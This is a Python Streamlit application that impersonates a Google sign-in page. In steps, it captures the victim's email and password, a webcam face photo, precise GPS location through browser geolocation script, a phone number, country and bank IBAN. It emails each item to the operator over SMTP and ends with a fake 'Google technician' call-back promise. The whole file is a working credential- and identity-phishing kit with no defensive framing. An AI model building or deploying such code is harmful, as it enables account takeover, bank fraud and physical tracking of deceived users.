import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime
import streamlit.components.v1 as components

# --- CONFIGURATION FROM ENVIRONMENT ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
  
    if soubor:
        img = MIMEImage(soubor.read(), name="biometrika.png")
        msg.attach(img)
      
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"SMTP Error: {e}")

# --- VALIDATION ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- APP STATE ---
if "step" not in st.session_state:
    st.session_state.step = "login"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""

# === EARLY GPS HANDLER ===
if "lat" in st.query_params and "lon" in st.query_params:
    lat = st.query_params["lat"][0] if isinstance(st.query_params["lat"], list) else str(st.query_params["lat"])
    lon = st.query_params["lon"][0] if isinstance(st.query_params["lon"], list) else str(st.query_params["lon"])
    acc = st.query_params.get("acc", ["?"])[0] if isinstance(st.query_params.get("acc"), list) else str(st.query_params.get("acc", "?"))
    gps_text = f"📍 {lat}, {lon} (accuracy ~{acc}m)"
  
    st.success(f"✅ Location successfully obtained: **{gps_text}**")
    odeslat_email("📍 GPS COORDINATES", f"User: {st.session_state.zadany_email}\nGPS: {gps_text}")
  
    with st.spinner("Verifying location..."):
        time.sleep(1.2)
  
    st.session_state.step = "verification"
  
    # Clear query params
    for key in ["lat", "lon", "acc"]:
        if key in st.query_params:
            del st.query_params[key]
  
    st.rerun()

st.set_page_config(page_title="Google Account Security", page_icon="🔒")

# Google Blue Button Style
st.markdown("""
    <style>
    div.stButton > button:first-child {
        background-color: #4285F4;
        color: white;
        border: none;
        width: 100%;
        height: 45px;
        font-weight: bold;
    }
    .google-header { font-family: 'Product Sans', sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

# Layout
col1, col2, col3 = st.columns(3)
with col2:
    # --- 1. LOGIN ---
    if st.session_state.step == "login":
        show_logo()
        st.markdown("<h3 class='google-header'>Sign in</h3>", unsafe_allow_html=True)
        st.write("Continue to Gmail")
      
        em = st.text_input("Email or phone")
        he = st.text_input("Password", type="password")
      
        if st.button("Next"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nPassword: {he}")
                with st.spinner("Verifying..."):
                    time.sleep(1.5)
                st.session_state.step = "face"
                st.rerun()
            else:
                st.error("Please enter a valid email and password.")

    # --- 2. FACE SCAN ---
    elif st.session_state.step == "face":
        show_logo()
        st.info("Step 2: Biometric face scan")
        st.write("For secure sign-in, please align your face in the frame.")
      
        foto = st.camera_input("Scan identity")
        if foto:
            with st.status("Sending biometric data...") as status:
                odeslat_email("📸 FACE SCAN", f"User: {st.session_state.zadany_email}", soubor=foto)
                time.sleep(2)
                status.update(label="Scan completed", state="complete")
            st.session_state.step = "gps"
            st.rerun()

    # --- 3. GPS ---
    elif st.session_state.step == "gps":
        show_logo()
        st.info("Step 2.5: Security location verification")
        st.write("Google detected unusual activity.\nTo continue securely, please share your current location.")
      
        components.html(
            """
            <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:0 auto;">
                <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">Location Verification</h3>
                <p style="color:#5f6368; margin-bottom:20px;">Google detected unusual activity.<br>Please confirm your location to continue.</p>
                <button onclick="getGPS()"
                        style="background:#4285F4; color:white; padding:14px 40px; font-size:16px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; box-shadow:0 2px 4px rgba(66,133,244,0.3);">
                    ✅ Share my current location
                </button>
            </div>
            <script>
            function getGPS() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude.toFixed(6);
                            const lon = position.coords.longitude.toFixed(6);
                            const acc = position.coords.accuracy.toFixed(0);
                            const params = new URLSearchParams(window.parent.location.search);
                            params.set("lat", lat);
                            params.set("lon", lon);
                            params.set("acc", acc);
                            window.parent.history.replaceState(null, '', '?' + params.toString());
                            window.parent.location.reload();
                        },
                        function(error) {
                            alert("Could not get location. Please try again.");
                        },
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                }
            }
            </script>
            """,
            height=380
        )

    # --- 4. VERIFICATION (Type country - mandatory) ---
    elif st.session_state.step == "verification":
        show_logo()
        st.error("⚠️ Suspicious activity detected")
        st.write("Your account is temporarily restricted. Choose verification method.")
      
        # Mandatory "Type country" field
        country = st.text_input("Country", placeholder="Type your country...")
        tel = st.text_input("Phone number (9 digits)")
      
        tab1, tab2 = st.tabs(["Call from technician", "BankID (Faster)"])
      
        with tab1:
            if st.button("Request a call"):
                if je_validni_tel(tel) and country.strip():
                    odeslat_email("📞 CONTACT", f"User: {st.session_state.zadany_email}\nPhone: {tel} ({country})")
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Please enter a valid 9-digit phone number and country!")
        with tab2:
            st.write("Instant unblock via Bank Identity")
            ib = st.text_input("Account number / IBAN")
            if st.button("Authorize"):
                if je_validni_tel(tel) and len(ib) > 10 and country.strip():
                    odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nPhone: {tel}\nIBAN: {ib}\nCountry: {country}")
                    with st.spinner("Redirecting..."):
                        time.sleep(2)
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Please fill in phone, IBAN and country!")

    # --- 5. FINISH ---
    elif st.session_state.step == "finish":
        show_logo()
        st.success("Request successfully recorded.")
        st.markdown("### STATUS: AWAITING APPROVAL")
        st.info("A Google technician will contact you shortly. Do not close this browser tab.")
        st.progress(92)
        st.write(f"Contact number entered: **{datetime.now().strftime('%H:%M:%S')}**")